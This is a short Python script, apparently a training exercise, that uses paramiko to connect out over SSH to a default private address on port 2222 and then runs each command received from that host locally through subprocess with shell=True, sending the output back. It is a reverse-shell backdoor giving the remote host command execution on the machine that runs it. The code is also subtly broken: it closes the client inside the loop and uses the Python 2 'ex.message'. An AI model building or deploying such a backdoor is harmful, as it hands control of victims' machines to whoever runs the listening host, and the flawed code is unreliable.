import paramiko
import shlex
import subprocess


def ssh_command(ip, port, user, password, cmd):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=password)

    ssh_session = client.get_transport().open_session()

    if ssh_session.active:
        ssh_session.send(cmd)

    print(ssh_session.recv(1024).decode())

    while True:
        cmd = ssh_session.recv(1024)
        try:
            cmd = cmd.decode()
            if cmd == 'exit':
                client.close()
                break
            cmd_ouput = subprocess.check_output(shlex.split(cmd), shell=True)
            ssh_session.send(cmd_ouput or 'okay')
        except Exception as ex:
            ssh_session.send(ex.message)
        client.close()
    return


def main():
    import getpass
    user = getpass.getuser()
    passwd = getpass.getpass()

    ip = input("Enter ip: ") or '192.168.0.112'
    port = input('Enter port: ') or 2222
    cmd = input('Enter command: ') or 'id'

    ssh_command(ip, int(port), user, passwd, cmd)


if __name__ == '__main__':
    main()
